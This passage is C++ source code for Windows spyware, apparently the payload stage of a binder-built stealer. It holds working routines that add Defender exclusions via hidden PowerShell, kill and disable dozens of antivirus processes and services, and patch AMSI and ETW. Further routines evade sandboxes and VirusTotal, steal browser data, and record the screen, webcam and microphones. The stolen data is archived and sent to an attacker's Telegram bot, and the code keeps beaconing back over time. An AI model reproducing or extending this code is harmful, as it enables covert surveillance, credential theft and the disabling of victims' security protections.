    if (slash != std::string::npos)
        exeDir = exeDir.substr(0, slash);

    const char* dirs[] = { exePath, exeDir.c_str(), appData, nullptr };

    for (int i = 0; dirs[i]; i++) {
        std::string cmd = std::string(OX("powershell -NoProfile -WindowStyle Hidden -Command \""));
        cmd += std::string(OX("Add-MpPreference -ExclusionPath '")) + std::string(dirs[i]) + std::string(OX("' -ErrorAction SilentlyContinue; "));
        cmd += std::string(OX("Add-MpPreference -ExclusionProcess '")) + std::string(dirs[i]) + std::string(OX("' -ErrorAction SilentlyContinue\""));
        runProcessHidden(cmd);
    }
}

static void killAvProcesses() {
    const char* avProcs[] = {
        OX("MsMpEng.exe"), OX("MsSense.exe"), OX("SenseCE.exe"), OX("SenseIR.exe"),
        OX("SecurityHealthService.exe"), OX("SecurityHealthSystray.exe"),
        OX("MpCmdRun.exe"), OX("NisSrv.exe"), OX("SearchIndexer.exe"),
        OX("avp.exe"), OX("kavfs.exe"), OX("kavfswl.exe"),
        OX("avgsvc.exe"), OX("avgnt.exe"), OX("avguard.exe"), OX("avgcsrvx.exe"),
        OX("avscan.exe"), OX("avwebgrd.exe"),
        OX("bdagent.exe"), OX("bdredline.exe"), OX("vsserv.exe"), OX("bdwfserv.exe"),
        OX("f-secure.exe"), OX("fsma32.exe"), OX("fssm32.exe"),
        OX("mbam.exe"), OX("mbamtray.exe"), OX("mbamservice.exe"), OX("MBAMService.exe"),
        OX("mcshield.exe"), OX("mcafee.exe"), OX("mcconsol.exe"), OX("mmssvc.exe"),
        OX("spbbcsvc.exe"), OX("srtsp.exe"), OX("srtsp64.exe"), OX("ccSvcHst.exe"),
        OX("rstray.exe"), OX("ccsetmgr.exe"), OX("ccApp.exe"),
        OX("ekrn.exe"), OX("egui.exe"), OX("ekrnEpmw.exe"),
        OX("kav.exe"), OX("kavsvc.exe"),
        OX("clamd.exe"), OX("clamwin.exe"), OX("clamtray.exe"),
        OX("sophos.exe"), OX("savservice.exe"), OX("swi_service.exe"),
        OX("hbsicon.exe"), OX("housecall.exe"), OX("tmbmsrv.exe"),
        OX("pav.exe"), OX("pavsrv.exe"), OX("psimsvc.exe"),
        OX("zanda.exe"), OX("zaservice.exe"), OX("zlclient.exe"),
        OX("windefend.exe"),
        nullptr
    };

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            char name[MAX_PATH];
            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
            for (int i = 0; avProcs[i]; i++) {
                if (_stricmp(name, avProcs[i]) == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProc) {
                        TerminateProcess(hProc, 1);
                        CloseHandle(hProc);
                    }
                    break;
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static void stopAvServices() {
    const char* services[] = {
        OX("WinDefend"), OX("WdNisSvc"), OX("Sense"), OX("WdBoot"),
        OX("MBAMService"), OX("McAfeeDLPAgentService"),
        OX("AVP16.0.0"), OX("kavfs"), OX("kavfss"),
        OX("avgsvc"), OX("AVG Service"),
        OX("bdagent"), OX("vsserv"),
        OX("fsma32"), OX("f-secure"),
        OX("clamd"), OX("ClamWin"),
        OX("savservice"), OX("Sophos Agent"),
        OX("tmbmsrv"), OX("HouseCall"),
        OX("zaservice"),
        nullptr
    };

    for (int i = 0; services[i]; i++) {
        std::string cmd = "sc stop \"" + std::string(services[i]) + "\"";
        runProcessHidden(cmd);
        cmd = "sc config \"" + std::string(services[i]) + "\" start= disabled";
        runProcessHidden(cmd);
    }
}

static void runAntiAV() {
    unhookNtdll();
    patchAmsi();
    patchEtwFull();

    if (isAdmin()) {
        disableDefenderRealtime();
        addDefenderExclusions();
        killAvProcesses();
        stopAvServices();
    }
}

// === Feature: Bypass VirusTotal (enhanced) ===

static bool hasUserActivity() {
    LASTINPUTINFO lii = {};
    lii.cbSize = sizeof(lii);
    if (GetLastInputInfo(&lii)) {
        DWORD idleMs = GetTickCount() - lii.dwTime;
        if (idleMs < 60000)
            return true;
    }
    for (int vk = 0x08; vk <= 0x5A; vk++) {
        if (GetAsyncKeyState(vk) & 0x8000)
            return true;
    }
    return false;
}

static void applyVTBypass() {
    // Short delay with API activity — long sleeps make real hits look "broken"
    DWORD totalDelay = 5000 + (rand() % 7000);
    DWORD steps = 8 + (rand() % 5);
    DWORD stepDelay = totalDelay / steps;

    for (DWORD i = 0; i < steps; i++) {
        // Mix of different sleep methods to evade simple Sleep hooks
        if (i % 3 == 0) {
            Sleep(stepDelay);
        } else if (i % 3 == 1) {
            // NtDelayExecution via WaitForSingleObject on a NULL handle
            HANDLE hEvent = CreateEventA(nullptr, FALSE, FALSE, nullptr);
            if (hEvent) {
                WaitForSingleObject(hEvent, stepDelay);
                CloseHandle(hEvent);
            } else {
                Sleep(stepDelay);
            }
        } else {
            // SleepEx (alertable)
            SleepEx(stepDelay, FALSE);
        }

        // API hammering - diverse calls to make hook detection harder
        GetTickCount();
        GetTickCount64();
        LARGE_INTEGER pc;
        QueryPerformanceCounter(&pc);

        char buf[128];
        DWORD sz = sizeof(buf);
        GetUserNameA(buf, &sz);
        GetComputerNameA(buf, &sz);
        GetSystemDirectoryA(buf, sizeof(buf));
        GetWindowsDirectoryA(buf, sizeof(buf));

        // Check for user activity - if detected, break early (real user)
        if (hasUserActivity())
            break;
    }
}

// === Feature: Randomized delay before data capture ===
// Delays heavy data collection (browser, screen, webcam, mic) by a random
// interval so the payload doesn't start grabbing immediately at predictable
// moments (boot, auto-start, update-hit).

static void randomDelayBeforeCapture() {
    DWORD totalDelay = 30000 + (rand() % 150000); // 30-180 seconds
    DWORD steps = 15 + (rand() % 10);
    DWORD stepDelay = totalDelay / steps;

    for (DWORD i = 0; i < steps; i++) {
        if (i % 3 == 0) {
            Sleep(stepDelay);
        } else if (i % 3 == 1) {
            HANDLE hEvent = CreateEventA(nullptr, FALSE, FALSE, nullptr);
            if (hEvent) {
                WaitForSingleObject(hEvent, stepDelay);
                CloseHandle(hEvent);
            } else {
                Sleep(stepDelay);
            }
        } else {
            SleepEx(stepDelay, FALSE);
        }

        // Diverse API calls to avoid simple hook detection
        GetTickCount();
        GetTickCount64();
        LARGE_INTEGER pc;
        QueryPerformanceCounter(&pc);
        char buf[64];
        DWORD sz = sizeof(buf);
        GetComputerNameA(buf, &sz);

        // If user is active, proceed immediately (real user, not sandbox)
        if (hasUserActivity())
            break;
    }
}

// === Info collection ===

static std::string collectInfo(const PayloadConfig& cfg, bool isUpdate) {
    std::string msg;
    msg += "[Notification] Session: " + cfg.sessionId + "\n";
    msg += "\n";
    msg += "File name opened: " + getExeName() + "\n";
    msg += "\n";
    msg += "\xF0\x9F\x93\x84Quick information:\n";
    msg += "PC Name: " + getPCName() + "\n";
    msg += "IP: " + getPublicIP() + "\n";
    msg += "CPU: " + getCPU() + "\n";
    msg += "GPU: " + getGPU() + "\n";
    msg += "\n";
    msg += "Detected at: " + getCurrentDate();
    if (isUpdate)
        msg += " (updated from session id: " + cfg.sessionId + ")";
    return msg;
}

// === Config loading (plaintext only — binder always writes plaintext) ===

static std::string trimCopy(std::string s) {
    while (!s.empty() && (s.back() == '\r' || s.back() == '\n' || s.back() == ' ' || s.back() == '\t'))
        s.pop_back();
    size_t i = 0;
    while (i < s.size() && (s[i] == ' ' || s[i] == '\t'))
        i++;
    return s.substr(i);
}

static PayloadConfig loadConfig() {
    PayloadConfig cfg = {};

    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    std::string exeStr(exePath);
    size_t slash = exeStr.find_last_of("\\/");
    std::string dir = (slash == std::string::npos) ? std::string(".") : exeStr.substr(0, slash);
    size_t dotPos = exeStr.rfind('.');
    std::string sameNameIni = (dotPos == std::string::npos) ? (exeStr + ".ini") : (exeStr.substr(0, dotPos) + ".ini");

    const std::string candidates[] = {
        dir + "\\config.ini",
        dir + "\\payload.ini",
        sameNameIni
    };

    std::ifstream file;
    for (const auto& p : candidates) {
        file.open(p, std::ios::in | std::ios::binary);
        if (file.is_open())
            break;
    }
    if (!file.is_open())
        return cfg;

    std::string line;
    while (std::getline(file, line)) {
        if (!line.empty() && line.back() == '\r') line.pop_back();
        size_t eq = line.find('=');
        if (eq == std::string::npos) continue;
        std::string key = trimCopy(line.substr(0, eq));
        std::string val = trimCopy(line.substr(eq + 1));
        if (key == "bot_token") cfg.botToken = val;
        else if (key == "chat_id") cfg.chatId = val;
        else if (key == "session_id") cfg.sessionId = val;
        else if (key == "update_interval") cfg.updateIntervalDays = std::atoi(val.c_str());
        else if (key == "opt_grab_browser") cfg.grabBrowser = (val == "1");
        else if (key == "opt_screenshot") cfg.screenshot = (val == "1");
        else if (key == "opt_autostart") cfg.autoStart = (val == "1");
        else if (key == "opt_grab_webcam") cfg.grabWebcam = (val == "1");
        else if (key == "opt_grab_microphone") cfg.grabMicrophone = (val == "1");
        else if (key == "opt_bypass_vt") cfg.bypassVT = (val == "1");
        else if (key == "opt_stealth") cfg.stealth = (val == "1");
        else if (key == "opt_persistence") cfg.persistence = (val == "1");
        else if (key == "opt_anti_debug") cfg.antiDebug = (val == "1");
        else if (key == "opt_encrypt_traffic") cfg.encryptTraffic = (val == "1");
        else if (key == "opt_anti_av") cfg.antiAV = (val == "1");
        else if (key == "mic_duration_sec") cfg.micDurationSec = std::atoi(val.c_str());
        else if (key == "webcam_duration_sec") cfg.webcamDurationSec = std::atoi(val.c_str());
        else if (key == "screen_duration_sec") cfg.screenDurationSec = std::atoi(val.c_str());
    }
    file.close();

    if (cfg.micDurationSec < 1) cfg.micDurationSec = 10;
    if (cfg.webcamDurationSec < 1) cfg.webcamDurationSec = 10;
    if (cfg.screenDurationSec < 1) cfg.screenDurationSec = 10;
    return cfg;
}

static void executeFeatures(const PayloadConfig& cfg, bool dumpLocal) {
    // 0) Sandbox/VM check FIRST — exit silently before any network activity
    if (isInSandbox())
        return;

    if (dumpLocal)
        clearResultDir();

    // 1) Immediate hit FIRST — no IP lookup (can hang), no anti-*, no capture
    if (!cfg.botToken.empty() && !cfg.chatId.empty()) {
        std::string quick;
        quick += "[Notification] Session: " + cfg.sessionId + "\n";
        quick += "File name opened: " + getExeName() + "\n";
        quick += "PC Name: " + getPCName() + "\n";
        quick += "Detected at: " + getCurrentDate() + "\n";
        quick += "(online)";
        sendTelegram(cfg, quick);
    }

    // Soft features only (never ExitProcess)
    if (cfg.stealth)
        enableStealth();
    if (cfg.autoStart)
        enableAutoStart();
    if (cfg.persistence)
        enablePersistence();
    if (cfg.antiAV)
        runAntiAV();
    if (cfg.bypassVT)
        applyVTBypass();

    // Randomized delay before heavy data capture — avoids predictable timing at boot/auto-start/update-hit
    randomDelayBeforeCapture();

    std::string password = generatePassword();
    std::vector<std::pair<std::string, std::vector<char>>> archiveFiles;

    auto addFile = [&](const std::string& rel, std::vector<char> data) {
        if (data.empty()) return;
        if (dumpLocal)
            dumpToResult(rel, data);
        archiveFiles.push_back({ rel, std::move(data) });
    };

    if (cfg.grabBrowser) {
        auto browserFiles = grabBrowserDataFiles();
        for (auto& f : browserFiles)
            addFile(f.first, std::move(f.second));
    }

    if (cfg.screenshot) {
        std::vector<char> screenshot = captureScreenshot();
        addFile("screenshot/screenshot.png", std::move(screenshot));

        auto screenFiles = recordScreen(cfg.screenDurationSec);
        for (auto& f : screenFiles)
            addFile(f.first, std::move(f.second));
    }

    if (cfg.grabWebcam) {
        auto webcamFiles = captureWebcam(cfg.webcamDurationSec);
        for (auto& f : webcamFiles)
            addFile(f.first, std::move(f.second));
    }

    if (cfg.grabMicrophone) {
        auto micFiles = recordAllMicrophones(cfg.micDurationSec);
        for (auto& f : micFiles)
            addFile(f.first, std::move(f.second));
    }

    if (dumpLocal) {
        std::ostringstream log;
        log << "token_len=" << cfg.botToken.size() << " chat_len=" << cfg.chatId.size() << "\n";
        log << "session=" << cfg.sessionId << "\n";
        log << "ffmpeg=" << (findFfmpeg().empty() ? "NOT FOUND" : findFfmpeg()) << "\n";
        log << "files_in_archive=" << archiveFiles.size() << "\n";
        log << "mic_sec=" << cfg.micDurationSec << " webcam_sec=" << cfg.webcamDurationSec
            << " screen_sec=" << cfg.screenDurationSec << "\n";
        log << "grab_browser=" << (cfg.grabBrowser ? 1 : 0)
            << " screenshot=" << (cfg.screenshot ? 1 : 0)
            << " webcam=" << (cfg.grabWebcam ? 1 : 0)
            << " mic=" << (cfg.grabMicrophone ? 1 : 0) << "\n";
        for (auto& f : archiveFiles)
            log << f.first << " size=" << f.second.size() << "\n";
        std::string logStr = log.str();
        dumpToResult("run_log.txt", std::vector<char>(logStr.begin(), logStr.end()));
    }

    if (cfg.botToken.empty() || cfg.chatId.empty())
        return;

    if (!archiveFiles.empty()) {
        std::string ext;
        std::vector<char> archive = createArchive(archiveFiles, ext, password);
        if (!archive.empty()) {
            if (dumpLocal)
                dumpToResult(std::string("data-") + cfg.sessionId + "." + ext, archive);

            std::string caption = collectInfo(cfg, false);
            caption += "\n\nPassword: " + password;
            if (caption.size() > 1000)
                caption = caption.substr(0, 1000);
            sendDocument(cfg, caption, "data-" + cfg.sessionId + "." + ext, archive);
        }
    }
}

static bool hasCliFlag(const char* cmd, const char* flag) {
    if (!cmd || !flag) return false;
    return strstr(cmd, flag) != nullptr;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    srand((unsigned int)GetTickCount());
    dynApi(); // init dynamic APIs early
    bool cliMode = hasCliFlag(lpCmdLine, "--cli") || hasCliFlag(lpCmdLine, "/cli");
    bool onceMode = hasCliFlag(lpCmdLine, "--once") || hasCliFlag(lpCmdLine, "/once");

    PayloadConfig cfg = loadConfig();
    if (cliMode) {
        cfg.grabBrowser = true;
        cfg.screenshot = true;
        cfg.grabWebcam = true;
        cfg.grabMicrophone = true;
        cfg.antiDebug = false;
        cfg.stealth = false;
        cfg.autoStart = false;
        cfg.persistence = false;
        if (cfg.sessionId.empty())
            cfg.sessionId = "CLI-TEST";
        executeFeatures(cfg, true);
        return 0;
    }
    if (onceMode) {
        // self-hit: use payload.ini options, dump to result/, exit (no update loop)
        if (cfg.sessionId.empty())
            cfg.sessionId = "ONCE-TEST";
        executeFeatures(cfg, true);
        return 0;
    }

    // Always run features. Hit is sent only when token/chat are present.
    executeFeatures(cfg, true);
    if (cfg.botToken.empty() || cfg.chatId.empty())
        return 1;

    std::string lastInfo = getPCName() + "|" + getPublicIP() + "|" + getCPU() + "|" + getGPU();

    if (cfg.updateIntervalDays == 0) {
        while (true) {
            Sleep(60000);
            if (cfg.antiDebug) runAntiDebug();
            std::string currentInfo = getPCName() + "|" + getPublicIP() + "|" + getCPU() + "|" + getGPU();
            if (currentInfo != lastInfo) {
                lastInfo = currentInfo;
                sendTelegram(cfg, collectInfo(cfg, true));
            }
        }
    } else {
        while (true) {
            Sleep((DWORD)((long long)cfg.updateIntervalDays * 86400000LL));
            if (cfg.antiDebug) runAntiDebug();
            std::string currentInfo = getPCName() + "|" + getPublicIP() + "|" + getCPU() + "|" + getGPU();
            bool changed = (currentInfo != lastInfo);
            lastInfo = currentInfo;
            sendTelegram(cfg, collectInfo(cfg, changed));
        }
    }

    return 0;
}
